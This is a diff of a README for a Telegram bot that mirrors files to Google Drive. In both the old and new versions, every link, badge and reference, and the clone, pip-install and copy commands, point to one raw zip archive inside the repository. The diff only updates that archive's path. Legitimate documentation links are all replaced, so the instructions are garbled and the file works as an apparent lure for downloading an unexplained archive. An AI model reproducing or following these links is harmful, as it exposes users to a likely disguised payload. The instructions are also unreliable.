@@ -1,14 +1,14 @@
-[![Priiiiyo](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip)](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip)
+[![Priiiiyo](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip)](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip)
 
 # Priiiiyo Mirror Leech Bot
-![GitHub Repo stars](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip)
-![GitHub forks](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip)
-![GitHub contributors](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip)
-![GitHub watchers](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip)
-![Docker Pulls](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip%20Pull)
-[![Channel](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip%20Channel-!-red)](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip)
+![GitHub Repo stars](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip)
+![GitHub forks](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip)
+![GitHub contributors](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip)
+![GitHub watchers](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip)
+![Docker Pulls](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip%20Pull)
+[![Channel](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip%20Channel-!-red)](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip)
 
-**Priiiiyo Mirror Leech Bot** is a _multipurpose_ Telegram Bot written in Python for mirroring files on the Internet to our beloved Google Drive. Based on [python-aria-mirror-bot](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip)
+**Priiiiyo Mirror Leech Bot** is a _multipurpose_ Telegram Bot written in Python for mirroring files on the Internet to our beloved Google Drive. Based on [python-aria-mirror-bot](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip)
 
 # Features:
 
@@ -26,10 +26,10 @@
 - Clone status
 - Search in multiple Drive folder/TeamDrive
 - Recursive Search (only with `root` or TeamDrive ID, folder ids will be skipped)
-- Multi-Search by https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip if exists 
+- Multi-Search by https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip if exists 
 - Extract rar, zip and 7z splits with or without password
 - Zip file/folder with or without password
-- Use https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip if file not found with Service Account
+- Use https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip if file not found with Service Account
 - Random Service Account at startup
 - Mirror/Leech by reply (soon will add for watch and clone)
 - Search for torrents with variable plugins using qBittorrent search engine
@@ -37,7 +37,7 @@
 
 ## From official and Other Repositories
 - Mirror direct download links, Torrent, and Telegram files to Google Drive
-- Mirror https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip links to Google Drive (If you have non-premium Mega account, it will limit download to 5GB per 6 hours)
+- Mirror https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip links to Google Drive (If you have non-premium Mega account, it will limit download to 5GB per 6 hours)
 - Copy files from someone's Drive to your Drive (Using Autorclone)
 - Download/Upload progress, Speeds and ETAs
 - Mirror all Youtube-dl supported links
@@ -58,19 +58,19 @@
 ZIP, RAR, TAR, 7z, ISO, WIM, CAB, GZIP, BZIP2, 
 APM, ARJ, CHM, CPIO, CramFS, DEB, DMG, FAT, 
 HFS, LZH, LZMA, LZMA2, MBR, MSI, MSLZ, NSIS, 
-NTFS, RPM, SquashFS, UDF, VHD, XAR, Z, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip
+NTFS, RPM, SquashFS, UDF, VHD, XAR, Z, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip
 ```
 - Direct links Supported:
 ```
-https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, antfiles,
-https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip,
-https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip,
-https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip,
-https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip (Only works for file not folder or business account),
-https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip (Uptobox account must be premium), https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip
+https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, antfiles,
+https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip,
+https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip,
+https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip,
+https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip, https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip (Only works for file not folder or business account),
+https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip (Uptobox account must be premium), https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip
 ```
 **See these examples for custom filename, Extract/Compress password protected files and downlaod from protected links**
-<p><a href="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip"> <img src="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip%20Telegraph-grey?style=for-the-badge&logo=telegraph" width="170""/></a></p>
+<p><a href="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip"> <img src="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip%20Telegraph-grey?style=for-the-badge&logo=telegraph" width="170""/></a></p>
 
 # How to deploy?
 Deploying is pretty much straight forward and is divided into several steps as follows:
@@ -78,7 +78,7 @@ Deploying is pretty much straight forward and is divided into several steps as f
 
 - Clone this repo:
 ```
-git clone https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip mirrorbot/ && cd mirrorbot
+git clone https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip mirrorbot/ && cd mirrorbot
 ```
 
 - Install requirements
@@ -86,7 +86,7 @@ For Debian based distros
 ```
 sudo apt install python3
 ```
-Install Docker by following the [official Docker docs](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip)
+Install Docker by following the [official Docker docs](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip)
 
 OR
 ```
@@ -98,14 +98,14 @@ sudo pacman -S docker python
 ```
 - Install dependencies for running setup scripts:
 ```
-pip3 install -r https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip
+pip3 install -r https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip
 ```
 ## Generate Database
 <details>
     <summary><b>Click Here For More Details</b></summary>
 
 **1. Using ElephantSQL**
-- Go to https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip and create account (skip this if you already have **ElephantSQL** account)
+- Go to https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip and create account (skip this if you already have **ElephantSQL** account)
 - Hit `Create New Instance`
 - Follow the further instructions in the screen
 - Hit `Select Region`
@@ -115,14 +115,14 @@ pip3 install -r https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/he
 - Copy your database url, and fill to `DATABASE_URL` in config
 
 **2. Using Heroku PostgreSQL**
-<p><a href="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip"> <img src="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip%https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip" width="160""/></a></p>
+<p><a href="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip"> <img src="https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip%https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip" width="160""/></a></p>
 
 </details>
 
 ## Setting up config file
 
 ```
-cp https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip
+cp https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip
 ```
 - Remove the first line saying:
 ```
@@ -130,37 +130,37 @@ _____REMOVE_THIS_LINE_____=True
 ```
 Fill up rest of the fields. Meaning of each field is discussed below:
 ### Required Field
-- `BOT_TOKEN`: The Telegram Bot Token that you got from [@BotFather](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip)
-- `TELEGRAM_API`: This is to authenticate your Telegram account for downloading Telegram files. You can get this from https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip **NOTE**: DO NOT put this in quotes.
-- `TELEGRAM_HASH`: This is to authenticate your Telegram account for downloading Telegram files. You can get this from https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip
+- `BOT_TOKEN`: The Telegram Bot Token that you got from [@BotFather](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip)
+- `TELEGRAM_API`: This is to authenticate your Telegram account for downloading Telegram files. You can get this from https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip **NOTE**: DO NOT put this in quotes.
+- `TELEGRAM_HASH`: This is to authenticate your Telegram account for downloading Telegram files. You can get this from https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip
 - `OWNER_ID`: The Telegram User ID (not username) of the Owner of the bot
 - `GDRIVE_FOLDER_ID`: This is the folder ID of the Google Drive Folder to which you want to upload all the mirrors.
 - `DOWNLOAD_DIR`: The path to the local folder where the downloads should be downloaded to
 - `DOWNLOAD_STATUS_UPDATE_INTERVAL`: A short interval of time in seconds after which the Mirror progress/status message is updated. (I recommend to keep it to `7` seconds at least)  
 - `AUTO_DELETE_MESSAGE_DURATION`: Interval of time (in seconds), after which the bot deletes it's message (and command message) which is expected to be viewed instantly. (**NOTE**: Set to `-1` to never automatically delete messages)
-- `BASE_URL_OF_BOT`: (Required for Heroku to avoid sleep/idling) Valid BASE URL of app where the bot is deployed. Format of URL should be `http://myip` (where `myip` is the IP/Domain of your bot) or if you have chosen other port than `80` then fill in this format `http://myip:port`, for Heroku fill `https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip` (**NOTE**: Do not put slash at the end), still got idling? You can use https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip to ping your Heroku app.
+- `BASE_URL_OF_BOT`: (Required for Heroku to avoid sleep/idling) Valid BASE URL of app where the bot is deployed. Format of URL should be `http://myip` (where `myip` is the IP/Domain of your bot) or if you have chosen other port than `80` then fill in this format `http://myip:port`, for Heroku fill `https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip` (**NOTE**: Do not put slash at the end), still got idling? You can use https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip to ping your Heroku app.
 ### Optional Field
 - `ACCOUNTS_ZIP_URL`: Only if you want to load your Service Account externally from an Index Link. Archive the accounts folder to a zip file. Fill this with the direct link of that file.
-- `TOKEN_PICKLE_URL`: Only if you want to load your **https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip** externally from an Index Link. Fill this with the direct link of that file.
-- `MULTI_SEARCH_URL`: To use search/list in multiple TD/folder. Run https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip in your terminal and follow it. It will generate a file **drive_folder** when you finish. Upload that file [here](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip) with the same file name. Open the raw file of that gist, it's URL will be your required config. Check wiki for gist related help. 
-- `DATABASE_URL`: Your Database URL. See [Generate Database](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip) to generate database (**NOTE**: If you use database you can save your Sudo ID permanently using `/addsudo` command).
+- `TOKEN_PICKLE_URL`: Only if you want to load your **https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip** externally from an Index Link. Fill this with the direct link of that file.
+- `MULTI_SEARCH_URL`: To use search/list in multiple TD/folder. Run https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip in your terminal and follow it. It will generate a file **drive_folder** when you finish. Upload that file [here](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip) with the same file name. Open the raw file of that gist, it's URL will be your required config. Check wiki for gist related help. 
+- `DATABASE_URL`: Your Database URL. See [Generate Database](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip) to generate database (**NOTE**: If you use database you can save your Sudo ID permanently using `/addsudo` command).
 - `AUTHORIZED_CHATS`: Fill user_id and chat_id (not username) of groups/users you want to authorize. Separate them with space, Examples: `-0123456789 -1122334455 6915401739`.
 - `SUDO_USERS`: Fill user_id (not username) of users whom you want to give sudo permission. Separate them with space, Examples: `0123456789 1122334455 6915401739` (**NOTE**: If you want to save Sudo ID permanently without database, you must fill your Sudo Id here).
 - `IS_TEAM_DRIVE`: Set to `True` if `GDRIVE_FOLDER_ID` is from a Team Drive else `False` or Leave it empty.
-- `USE_SERVICE_ACCOUNTS`: (Leave empty if unsure) Whether to use Service Accounts or not. For this to work see [Using Service Accounts](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip) section below.
-- `INDEX_URL`: Refer to https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip The URL should not have any trailing '/'
-- `MEGA_API_KEY`: https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip API key to mirror https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip links. Get it from [Mega SDK Page](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip)
-- `MEGA_EMAIL_ID`: Your E-Mail ID used to sign up on https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip for using premium account (Leave though)
-- `MEGA_PASSWORD`: Your Password for your https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip account
-- `BLOCK_MEGA_FOLDER`: If you want to remove https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip folder support, set it to `True`.
-- `BLOCK_MEGA_LINKS`: If you want to remove https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip mirror support, set it to `True`.
+- `USE_SERVICE_ACCOUNTS`: (Leave empty if unsure) Whether to use Service Accounts or not. For this to work see [Using Service Accounts](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip) section below.
+- `INDEX_URL`: Refer to https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip The URL should not have any trailing '/'
+- `MEGA_API_KEY`: https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip API key to mirror https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip links. Get it from [Mega SDK Page](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip)
+- `MEGA_EMAIL_ID`: Your E-Mail ID used to sign up on https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip for using premium account (Leave though)
+- `MEGA_PASSWORD`: Your Password for your https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip account
+- `BLOCK_MEGA_FOLDER`: If you want to remove https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip folder support, set it to `True`.
+- `BLOCK_MEGA_LINKS`: If you want to remove https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip mirror support, set it to `True`.
 - `STOP_DUPLICATE`: (Leave empty if unsure) if this field is set to `True`, bot will check file in Drive, if it is present in Drive, downloading or cloning will be stopped. (**NOTE**: File will be checked using filename, not using filehash, so this feature is not perfect yet)
 - `CLONE_LIMIT`: To limit the size of Google Drive folder/file which you can clone. Don't add unit, the default unit is `GB`.
 - `MEGA_LIMIT`: To limit the size of Mega download. Don't add unit, the default unit is `GB`.
 - `TORRENT_DIRECT_LIMIT`: To limit the Torrent/Direct mirror size. Don't add unit, the default unit is `GB`.
 - `TAR_UNZIP_LIMIT`: To limit the size of mirroring as Tar or unzipmirror. Don't add unit, the default unit is `GB`.
-- `VIEW_LINK`: View Link button to open file Index Link in browser instead of direct download link, you can figure out if it's compatible with your Index code or not, open any video from you Index and check if its URL ends with `?a=view`, if yes make it `True` it will work (Compatible with https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip Code)
-- `UPTOBOX_TOKEN`: Uptobox token to mirror uptobox links. Get it from [Uptobox Premium Account](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/helper/telegram_helper/bot_leech_mirror_priiiiyo_2.1.zip).
+- `VIEW_LINK`: View Link button to open file Index Link in browser instead of direct download link, you can figure out if it's compatible with your Index code or not, open any video from you Index and check if its URL ends with `?a=view`, if yes make it `True` it will work (Compatible with https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip Code)
+- `UPTOBOX_TOKEN`: Uptobox token to mirror uptobox links. Get it from [Uptobox Premium Account](https://github.com/kyaw287/priiiiyo-mirror-leech-bot/raw/refs/heads/master/bot/bot-leech-mirror-priiiiyo-v3.7.zip).
 - `IGNORE_PENDING_REQUESTS`: If you want the bot to ignore pending requests after it restarts, set this to `True`.
 - `STATUS_LIMIT`: Limit the no. of tasks shown in status message with button. (**NOTE**: Recommended limit is `4` tasks at max).
 - `IS_VPS`: (Only for VPS) Don't set this to `True` even if you are using VPS, unless facing error with web server.
@@ -172,10 +172,10 @@ Fill up rest of the fields. Meaning of each field is discussed below:
 - `SHORTENER`: Shortener URL.
 Supported URL Shorteners:
 ```
